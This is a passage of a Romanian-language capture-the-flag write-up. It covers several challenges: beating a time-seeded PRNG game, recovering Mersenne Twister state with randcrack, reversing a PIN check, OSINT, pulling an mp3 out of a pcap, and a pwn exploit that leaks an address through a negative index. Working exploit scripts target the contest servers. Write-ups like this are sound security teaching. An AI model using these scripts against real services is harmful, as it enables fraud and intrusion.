        default=Path("."), # Default to current directory
        help="Directory to save the extracted PNG file(s). Default: current directory."
    )
    parser.add_argument(
        "--no-lsb",
        action="store_true",
        help="Skip the automatic LSB steganography check after extraction."
    )

    args = parser.parse_args()

    # Perform extraction
    extracted_file_path = extract_png(args.input_bin_file, args.output_dir)

    # Perform LSB check if extraction succeeded and not skipped
    if extracted_file_path and not args.no_lsb:
        check_lsb(extracted_file_path)
    elif args.no_lsb:
        print("[*] Skipping LSB check as requested by --no-lsb flag.")
```

### bnc - Cryptography

##### Dovada obtinerii flagului

ctf{5fd924625f6ab16a19cc9807c7c506ae1813490e4ba675f843d5a10e0baacdb8}

##### Sumar

Serverul lua decizii in functie de timestamp, acest fapt fiind predictibil.

##### Dovada rezolvarii

In urma publicarii codului sursa, s-a observat imediat faptul ca exista un PRNG vulnerabil.
Exploatarea unui generator de numere pseudo-aleatorii (PRNG) predictibil pentru a castiga in mod consistent la un joc de "Bear, Ninja, Cowboy" a fost metoda de rezolvare.

Pentru a exploata această vulnerabilitate, am creat un script care:

Se conecteaza la server.
Foloseste acelasi timestamp pentru a sincroniza generatorul local de numere aleatorii cu cel al serverului
Prevede alegerea urmatoare a serverului
Trimite alegerea care va castiga impotriva alegerii preconizate a serverului.

Pentru a gestiona potentialele diferențe de timp intre sistemul local si server, scriptul incearca mai multe offseturi de timp (-1, 0, 1, 2, 3 secunde) pentru a gasi sincronizarea corecta.
Logica de castig implementata este:
```json
win_map = {
    "Bear": "Cowboy",  # Cowboy invinge Bear
    "Ninja": "Bear",   # Bear invinge Ninja
    "Cowboy": "Ninja"  # Ninja invinge Cowboy
}
```

Script de rezolvare:
```python

import random
import time
from pwn import *
import re

# Server details - Use the IP/Port from your latest attempt
HOST = "34.107.108.126"
PORT = 30294

# Game constants
choices = ["Bear", "Ninja", "Cowboy"]

# ORIGINAL logic: Map computer's choice to the choice we need to WIN
win_map = {
    "Bear": "Cowboy",  # Cowboy beats Bear
    "Ninja": "Bear",   # Bear beats Ninja
    "Cowboy": "Ninja"  # Ninja beats Cowboy
}
log.info(f"Using ORIGINAL win map: {win_map}")

# --- Try connecting and solving ---
for offset in range(-1, 4): # Try offsets -1, 0, 1, 2, 3 for wider time sync window
    conn = None
    try:
        log.info(f"Attempting connection with time offset: {offset}")
        conn = remote(HOST, PORT)

        conn.recvuntil(b"Welcome to Bear, Ninja, Cowboy!")
        print("Connected.")

        seed_time = int(time.time()) + offset
        log.info(f"Using potential seed time: {seed_time}")

        random.seed(seed_time)

        win_streak = 0
        target_wins = 30
        rounds_played = 0

        while win_streak < target_wins and rounds_played < target_wins + 15: # Safety break
            rounds_played += 1

            # --- Read current state ---
            prompt_output = conn.recvuntil(b"Type your choice: ").decode()
            match = re.search(r"Win streak: (\d+)/", prompt_output)
            if match:
               current_server_streak = int(match.group(1))
               # Sync our streak count with the server's report
               if win_streak != current_server_streak:
                   log.info(f"Syncing streak: Server={current_server_streak}, Script={win_streak}")
                   win_streak = current_server_streak
               else:
                   log.info(f"Server reports streak: {current_server_streak}")
            else:
                log.warning("Could not parse win streak from server output.")
                # Optional: break if parsing fails badly?

            # --- Predict and Send ---
            predicted_computer_choice = random.choice(choices)
            log.info(f"Local RNG predicted: {predicted_computer_choice}")

            # Use the ORIGINAL win map logic
            player_choice = win_map[predicted_computer_choice]
            log.info(f"Sending choice to win (original logic): {player_choice}")
            conn.sendline(player_choice.encode())

            # --- Read Results Robustly ---
            try:
                # Consume output until the player's choice is confirmed
                conn.recvuntil(f"You chose: {player_choice}".encode(), timeout=2)
                log.info(f"Confirmed: You chose: {player_choice}")

                # Consume output until the computer's choice is revealed
                # Handle potential extra newlines before "Computer chose:"
                computer_line_raw = conn.recvuntil(b"Computer chose: ", timeout=2)
                computer_choice_line = conn.recvline(keepends=False, timeout=2).decode().strip()
                log.info(f"Server reports: Computer chose: {computer_choice_line}")

                # Now read the result line
                result_line = conn.recvline(keepends=False, timeout=2).decode().strip()
                log.info(f"Result: {result_line}")

            except EOFError:
                log.error("EOFError while reading result. Connection likely closed.")
                break # Exit inner loop
            except PwnlibException as e: # Catches timeout
                 log.error(f"Timeout or pwnlib error reading result: {e}")
                 break # Exit inner loop


            # --- Process Result ---
            if "win" in result_line:
                log.success("WIN CONFIRMED!")
                win_streak += 1 # Increment win streak (will be re-synced next loop anyway)
            elif "lose" in result_line:
                log.warning("Lost round - seed was likely incorrect. Trying next offset.")
                break # Break inner loop to try next offset
            elif "tie" in result_line:
                log.info("Tie confirmed. Streak unchanged.")
            else:
                log.error(f"Unexpected result line content: {result_line}")
                break # Break inner loop

            # Check if we reached the goal
            if win_streak == target_wins:
                break

        # --- Post-Loop Check ---
        if win_streak == target_wins:
            log.success("Achieved target wins!")
            try:
                flag_output = conn.recvall(timeout=5).decode()
                log.success(f"FLAG OUTPUT:\n{flag_output}")
            except EOFError:
                 log.warning("Connection closed before flag could be read, but might have succeeded.")
            except Exception as e:
                 log.error(f"Error reading flag: {e}")
            conn.close()
            exit() # Success!

        # If loop ended for other reasons (loss, timeout, too many rounds)
        if conn.connected():
            conn.close()
            log.info("Closed connection.")

    except ConnectionRefusedError:
        log.error(f"Connection refused for offset {offset}. Server might be down or IP/port wrong.")
    except PwnlibException as e:
        log.error(f"PwnlibException during connection or initial recv (offset {offset}): {e}")
        if conn: conn.close()
    except Exception as e:
        log.error(f"An unexpected error occurred (offset {offset}): {e}")
        if conn: conn.close()


log.critical("Failed to get the flag after trying all offsets.")
```

### wheel-of-furtune - Cryptography

##### Dovada obtinerii flagului

ctf{49e6b3ba5aa5a624d22dd1d2cc46804b5d3c51b13096dffb5cd6af8a9ec4eed5}

##### Sumar

Generatorul MT19937 este vulnerabil si predictibil dupa 624 de valori.

##### Dovada rezolvarii

Exploatarea predictibilității generatorului de numere aleatorii Mersenne Twister (MT19937) pentru a prezice numerele generate de server si a castiga un joc de ghicit numere.

Formula folosita de server pentru a calcula numarul corect era:

```python
def calculate_number(initial_value):
    # Formula: ((((initial_value ^ 7) * 37 + 29) // 10000 + 1) % 100) + 1
    result = initial_value ^ 7       # XOR cu 7
    result = result * 37 + 29        # Inmultire cu 37 si adunare 29
    result = result // 10000 + 1     # Impartire intreaga la 10000 si adunare 1
    return result
```

Observatia cheie a fost ca valorile initiale nu erau cu adevarat aleatorii, ci generate folosind generatorul Mersenne Twister (MT19937) din Python. Acest generator are o stare interna de 624 de numere de 32 de biti si, odata ce cunoastem aceasta stare completa, putem prezice toate valorile viitoare.

Script de rezolvare:
```python
import socket
import re
import time
from randcrack import RandCrack

def calculate_number(initial_value):
    # Formula: ((((initial_value ^ 7) * 37 + 29) // 10000 + 1) % 100) + 1
    result = initial_value ^ 7
    result = result * 37 + 29
    result = result // 10000 + 1
    result = result % 100 + 1
    return result

def main():
    # Connect to the server
    host = "34.89.160.255"
    port = 32147
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(5)

    # Initialize randcrack for MT19937 state recovery
    cracker = RandCrack()

    # Store initial values
    initial_values = []
    guesses_made = 0
    predicting = False

    try:
        while True:
            # Receive data
            data = s.recv(4096).decode()
            if not data:
                break
            print(data, end='')

            # Parse initial value and correct number
            initial_value_match = re.search(r"Initial value: (\d+)", data)
            correct_number_match = re.search(r"= (\d+)$", data, re.MULTILINE)

            if initial_value_match:
                initial_value = int(initial_value_match.group(1))
                initial_values.append(initial_value)
                if correct_number_match:
                    correct_number = int(correct_number_match.group(1))
                    print(f"Stored: Initial={initial_value}, Correct={correct_number}")

                # Feed to randcrack if not yet predicting
                if not predicting and len(initial_values) <= 624:
                    cracker.submit(initial_value)
                    print(f"Submitted value {len(initial_values)}/624 to randcrack")

                # Check if we've collected 624 values
                if len(initial_values) == 624:
                    predicting = True
                    print("Collected 624 values, switching to prediction mode")

            # Guess when prompted
            if "Guess the number" in data:
                if not predicting:
                    # Make dummy guess to collect values
                    guess = 1
                else:
                    # Predict next initial value and compute correct number
                    next_initial = cracker.predict_getrandbits(32)
                    guess = calculate_number(next_initial)
                print(f"Guessing: {guess}")
                s.sendall(f"{guess}\n".encode())
                guesses_made += 1
                time.sleep(0.1)  # Avoid overwhelming the server

            # Check for flag
            if "flag" in data.lower():
                print("Flag received:", data)
                break

    except socket.timeout:
        print("Connection timed out")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        print(f"\nCollected {len(initial_values)} initial values:")
        print(initial_values)
        print(f"Total guesses made: {guesses_made}")
        s.close()

if __name__ == "__main__":
    main()
```

### PINv2 - Reverse Engineering

##### Dovada obtinerii flagului

CTF{ea875111287b0f7dd1db64c131e59ba2005e7a4611bace7aab827627e4161acc}

##### Sumar

Din codul sursa decompilat reiese modul in care se calculeaza PIN-ul.

##### Dovada

Cod vulnerabil decompilat cu Ghidra:
```c
undefined4
FUN_001016d8(uint param_1,int param_2,int param_3,int param_4,char param_5,char param_6,char param_7
            ,char param_8,int param_9,int param_10,int param_11,uint param_12,int param_13,
            uint param_14,int param_15)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  int iVar5;
  uint uVar6;
  undefined4 uVar7;
  
  iVar5 = rand();
  uVar6 = iVar5 % 1000;
  if ((param_1 == 2) || (param_2 == 2)) {
    bVar1 = false;
  }
  else {
    bVar1 = true;
  }
  if ((param_6 == 'R') && (param_7 == 't')) {
    bVar2 = true;
  }
  else {
    bVar2 = false;
  }
  if ((param_9 == 10) && (param_10 == param_11)) {
    bVar3 = true;
  }
  else {
    bVar3 = false;
  }
  if ((((param_1 == 0) && (param_12 == 0x7f)) && (param_3 == 1)) && ((uVar6 & 7) == 7)) {
    bVar4 = true;
  }
  else {
    bVar4 = false;
  }
  if ((((bVar1) && (param_3 != 2)) && ((param_4 != 1 && ((param_5 == '$' && (bVar2)))))) &&
     ((param_8 != 'O' &&
      (((((bVar3 && ((param_1 ^ param_12) == (uVar6 & 0xff))) && (param_13 + param_4 == 0xff)) &&
        (((int)(param_1 ^ param_14) % 8 == (uVar6 & 7) && (param_15 + param_4 == 0x7f)))) && (bVar4)
       ))))) {
    uVar7 = 1;
  }
  else {
    uVar7 = 0;
  }
  return uVar7;
}

```

Valori gasite si metoda de rezolvare:

```bash
printf "0\n0\n1\n0\n$\nR\nt\nA\n10\n0\n0\n127\n255\n7\n127\n" | nc 34.107.108.126 32672
Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: Find the right PIN: CTF{ea875111287b0f7dd1db64c131e59ba2005e7a4611bace7aab827627e4161acc}
```

### gaming-habbits - OSINT

##### Dovada obtinerii flagului

CTF{6acfb96047869efed819b66c2bab15565698d8295ca78d7d4859a94873dcc5ce}

##### Sumar

Reverse image search, coordonatele apareau intr-un comentariu de la o postare pe reddit
##### Dovada rezolvarii
Am copiat imaginea si am folosit google lens

![image.png](image.png)

Care ducea catre link-ul asta de [reddit](https://www.reddit.com/r/dayz/comments/1jwso0j/where_was_this_photo_taken/?show=original)

Am luat datele din comentariul lui [**BlintTheFlint](https://www.reddit.com/user/BlintTheFlint/)

Le-am formatat conform cerintei. Am bagat `Dobroye(1.29:0.03)NE` in sha256 calculator si am obtinut flagul

![image.png](image%201.png)

### silent-beacon - network

##### Dovada obtinerii flagului

CTF{32FAF5270D2AC7382047AC3864712CD8CB5B8999511A59A7C5CB5822E0805B91}

##### Sumar

Am gasit un mp3 in `capture.pcap` si l-am extras folosind `tshark`, in acel mp3 flagul era rostit
##### Dovada obtinerii rezultatului
Am gasit `.mp3` si am incercat sa-l extrag

![image.png](image%202.png)

Am pregatit filtrul astfel incat sa filtrez numai pachetele care trimit datele fisierului .mp3, respectiv toate pachetele care folosesc protocolul `OBEX` si sa fie ca si sursa `localhost` 

![image.png](image%203.png)

Si am extras continutul de la fiecare folosind urmatoarea comanda de `tshark`

```bash
tshark -r capture.pcap -Y '(obex.opcode == 0x02 || obex.opcode == 0x03' -e obex.header.value.byte_sequence -T fields > hex.hex
```

Fisierul contine magic bytes specifici mp3, deci in teorie ar trebui sa fie un mp3 functional.

![image.png](image%205.png)

![image.png](image%206.png)

L-am descarcat folosind CyberChef dupa ce am adaugat filtru de `From HEX`.

Ascultand mp3-ul, ni se dicteaza flagul.

### scoala-de-paunari - pwn

##### Dovada obtinerii flagului

CTF{plu5_s1_minu5_1n_sc4nf_d3zvalu1e_s3cre7e}

##### Sumar

Dupa o analiza a comportamentului la runtime folosind `checksec`, am dedus ca mecanismele de randomize la runtime fac ca comportamentele difera de la o rulare la alta, astfel the way to go-ul a fost analiza dinamica folsind `gdb cu ASLR-ul pe off` pentru a putea da predict la behavoir. Primul input string a fost `bypassed cu o valoare negativa`, alegerea lui -10 permitand afisarea unei adrese de 8B, iar `"-" ca input pentru al doilea input a facut functia scanf relativ nefunctionala`, permitand interactiunea ulterioara cu adresa primita - offsetul calculat cu GDB

##### Dovada rezolvarii

```python
from pwn import *

context.log_level = 'debug'
p = remote('34.107.108.126', 32595)

try:
    p.recvuntil(b'Introdu un numar cuprins intre 0-9: ')
    p.sendline(b'-10')
    p.recvuntil(b'Introdu o noua valoare: ')
    p.sendline(b'-')
    p.recvuntil(b'Valoarea introdusa la index -10 este = ')
    leaked_addr = int(p.recvline().strip(), 16)
    log.info(f'Leaked address: {hex(leaked_addr)}')

    offset = 0x3dd0
    base_addr = leaked_addr - offset
    log.info(f'Calculated base: {hex(base_addr)}')

    p.recvuntil(b'Introdu Adresa de memorie unde incepe Executabilul: ')
    p.sendline(str(hex(base_addr)))


    p.interactive()

except EOFError:
    log.error("Connection closed unexpectedly. Check server response or input.")
except Exception as e:
    log.error(f"An error occurred: {str(e)}")
finally:
    p.close()
```

![[Pasted image 20250413233855.png]]
